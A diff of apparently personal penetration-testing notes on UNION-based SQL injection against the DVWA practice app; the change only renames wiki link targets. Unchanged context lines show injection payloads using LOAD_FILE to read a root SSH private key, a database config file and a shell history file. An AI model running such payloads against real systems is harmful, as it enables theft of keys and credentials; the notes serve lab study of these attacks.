@@ -119,13 +119,13 @@ Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa
 ' UNION SELECT NULL, LOAD_FILE('/root/.ssh/id_rsa')#
 ```
 
-- Retrieve database config file. You have to lookup of what web technology it's using such as, a **content management system (CMS)** like wordpress. Find the absolute path of the [[Credentials#^bc9e6e|database config file]] after enumeration phase for the web root directory.
+- Retrieve database config file. You have to lookup of what web technology it's using such as, a **content management system (CMS)** like wordpress. Find the absolute path of the [[Content Management System (CMS)#^bc9e6e|database config file]] after enumeration phase for the web root directory.
 
 ```sql
 ' UNION SELECT NULL, LOAD_FILE('/var/www/html/dvwa/config.php')#
 ```
 
-- Retrieve history commands. You can find more in the [[Credentials|privilege escalation credentials]] section.
+- Retrieve history commands. You can find more in the [[Content Management System (CMS)|privilege escalation credentials]] section.
 
 ```sql
 ' UNION SELECT NULL, LOAD_FILE('/home/<username>/.ssh/.bash_history')#
@@ -206,7 +206,7 @@ Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa
 
 #### Credentials Access and Dumping
 
-- [[Credentials]]
+- [[Content Management System (CMS)]]
 
 ### Windows
 
